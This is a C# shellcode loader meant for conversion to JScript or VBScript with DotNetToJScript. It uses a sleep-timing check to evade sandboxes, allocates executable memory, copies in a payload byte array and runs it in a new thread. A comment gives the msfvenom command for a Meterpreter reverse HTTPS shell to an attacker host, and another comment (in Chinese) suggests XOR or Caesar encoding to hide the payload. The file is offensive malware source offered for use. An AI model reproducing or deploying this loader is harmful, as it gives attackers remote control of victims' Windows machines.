// Compile Command : DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript/VBScript --ver=v4 -o runner.js/vbs
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
              uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle,
        UInt32 dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);
    
    public TestClass()
    {
        DateTime t1 = DateTime.Now;
        Sleep(2000);
        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
        if (t2 < 1.5)
        {
            return;
        }

        // sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=XXX LPORT=443 EXITFUNC=thread -f csharp | tr -d '\n'
        byte[] buf = new byte[612] { 0xfc, 0x48, 0x83, 0xe4 ... };

        // 这里可以添加 Caesar 或 XOR 对应 Shellcode 解密代码

        int size = buf.Length;

        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
            IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}